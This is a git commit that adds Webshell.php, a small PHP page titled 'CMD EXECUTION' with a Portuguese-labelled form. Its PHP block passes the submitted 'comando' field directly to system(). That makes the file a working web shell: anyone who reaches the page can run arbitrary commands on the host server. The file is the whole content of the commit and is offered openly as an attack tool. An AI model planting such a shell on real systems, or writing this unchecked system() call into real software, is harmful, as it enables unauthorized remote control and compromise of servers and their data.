79ee4daad73f3f2f9f88f38c4ef099bc290d9e95
LeanerDev <81769809+LeanerDev@users.noreply.github.com>
2021-04-10 00:18:19 -0300

    Add files via upload

---
+++ Webshell.php
@@ -0,0 +1,29 @@
+<html
+<head>
+	<meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CMD EXECUTION</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+	
+</head>
+<body>
+	<img src="BoringGraveAmericanbobtail-small.gif">
+	<marquee behavior="slide"><lnk>https://github.com/LeanerDev</lnk></marquee>
+<form  action="Webshell.php" method="POST">
+comando: <br>
+<input type=text name="comando">
+<input type=submit  name="executa" value="executa">
+<h1>Comandos executados abaixo.</h1>
+
+
+
+
+
+</body>
+
+
+<?php
+  system($_POST['comando']);
+?>
+
